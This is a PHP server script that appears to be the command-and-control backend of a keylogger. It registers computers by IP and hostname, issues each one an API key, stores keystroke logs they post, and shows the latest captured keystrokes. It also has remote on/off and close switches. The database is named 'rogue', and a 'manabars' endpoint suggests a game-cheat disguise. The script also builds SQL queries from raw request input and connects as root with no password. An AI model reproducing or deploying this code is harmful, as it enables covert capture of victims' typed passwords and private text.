<?php
header("Access-Control-Allow-Origin: *");
$servername = "localhost";
$database = "rogue";
$username = "root";
$password = "";
// Create connection
$link = mysqli_connect($servername, $username, $password, $database);
// Check connection
if (!$link) {
      die("Connection failed: " . mysqli_connect_error());
}

function generateRandomString($length = 20)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
if(isset($_GET["off"])){
    $sql = "UPDATE `ajustes` SET `value` = '1' WHERE `ajustes`.`id` = 1;";
    mysqli_query($link, $sql);
}
if(isset($_GET["on"])){
    $sql = "UPDATE `ajustes` SET `value` = '0' WHERE `ajustes`.`id` = 1";
    mysqli_query($link, $sql);
}


if(isset($_POST["api"])){
    $api = $_POST["api"];
    if(isset($_POST["keylog"])){
        $keylog = $_POST["keylog"];
        $ahora = time();
        $sql = "INSERT INTO `keylogs` (`id`, `api`, `keylog`, `date`) VALUES (NULL, '$api', '$keylog', '$ahora');";
        mysqli_query($link, $sql);
        
    }
    if(isset($_GET["data"])){
        $sql = "SELECT * FROM ordenadores WHERE BINARY api = '$api'";
        $do = mysqli_query($link, $sql);
        $result = mysqli_fetch_assoc($do);
        $sql = "UPDATE `ordenadores` SET `cerrar` = '0' WHERE BINARY `ordenadores`.`api` = '$api'";
        mysqli_query($link, $sql);
        echo $result["cerrar"];
    }
}

if(isset($_POST["log"])){
    $sql = "SELECT * FROM keylogs ORDER BY id desc LIMIT 24";
    $do = mysqli_query($link, $sql);
    while($log = mysqli_fetch_assoc($do)){
        $keylog = filter_var ( $log["keylog"], FILTER_SANITIZE_STRING);
        $keylog = str_replace("[FLECHA_ARRIBA]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/cursor-up.png?raw=true'>", $keylog);
        $keylog = str_replace("[FLECHA_IZQUIERDA]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/cursor-left.png?raw=true'>", $keylog);
        $keylog = str_replace("[FLECHA_DERECHA]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/cursor-right.png?raw=true'>", $keylog);
        $keylog = str_replace("[FLECHA_ABAJO]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/cursor-down.png?raw=true'>", $keylog);
        $keylog = str_replace("[TAB]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/tab.png?raw=true'>", $keylog);
        $keylog = str_replace("[ALT]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/alt.png?raw=true'>", $keylog);
        $keylog = str_replace("[ALT_GR]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/alt-right.png?raw=true'>", $keylog);
        $keylog = str_replace("[BACKSPACE]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/backspace.png?raw=true'>", $keylog);
        $keylog = str_replace("[ENTER]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/enter.png?raw=true'>", $keylog);
        $keylog = str_replace("[RIGHT_SHIFT]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/shift-right.png?raw=true'>", $keylog);
        $keylog = str_replace("[ESC]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/esc.png?raw=true'>", $keylog);
        $keylog = str_replace("[MAYUS]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/shift.png?raw=true'>", $keylog);
        $keylog = str_replace("[MAYUSCULAS]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/capslock.png?raw=true'>", $keylog);
        $keylog = str_replace("[BLOQ_MAYUS]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/capslock.png?raw=true'>", $keylog);
        $keylog = str_replace("[INSERT]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/insert.png?raw=true'>", $keylog);
        $keylog = str_replace("[CTRL]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/ctrl.png?raw=true'>", $keylog);
        $keylog = str_replace("[RETROCESO]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/backspace.png?raw=true'>", $keylog);
        $keylog = str_replace("[SUPR]", "<img class='key' src='https://github.com/q2apro/keyboard-keys-speedflips/blob/master/single-keys-bordered/400dpi/delete.png?raw=true'>", $keylog);
        
        echo $keylog . "<br>";
    }
}

if(isset($_POST["getapi"])){
    $ip = $_POST["ip"];
    $hostname = $_POST["hostname"];
    $sql = "SELECT * FROM ordenadores WHERE BINARY ip = '$ip' and BINARY hostname = '$hostname'";
    if($do = mysqli_query($link, $sql)){
        if($do->num_rows == 1){
            $result = mysqli_fetch_assoc($do);
            echo $result["api"];
        }else{
            $api = generaterandomstring();
            $sql = "INSERT INTO `ordenadores` (`id`, `nombre_custom`, `api`, `ip`, `hostname`) VALUES (NULL, '', '$api', '$ip', '$hostname');";
            if(mysqli_query($link, $sql)){
                echo $api;
            }else{
                echo mysqli_error($link);
            }
        }
    }else{
         echo mysqli_error($link);
    }
    
   
    
}

if(isset($_POST["validar"])){
    $api = $_POST["validar"];
    $sql = "SELECT * FROM ordenadores WHERE BINARY api = '$api'";
    if($do = mysqli_query($link, $sql)){
        if($do->num_rows == 1){
            echo "OK";
        }
    }
}

if(isset($_POST["getmanabars"])){
    $sql = "SELECT * FROM manabars";
    $do = mysqli_query($link, $sql);
    while($manabar = mysqli_fetch_assoc($do)){
        echo  $manabar["nombre"] . ";" . $manabar["src"] . ";" . $manabar["id"] . ";;";
    }
}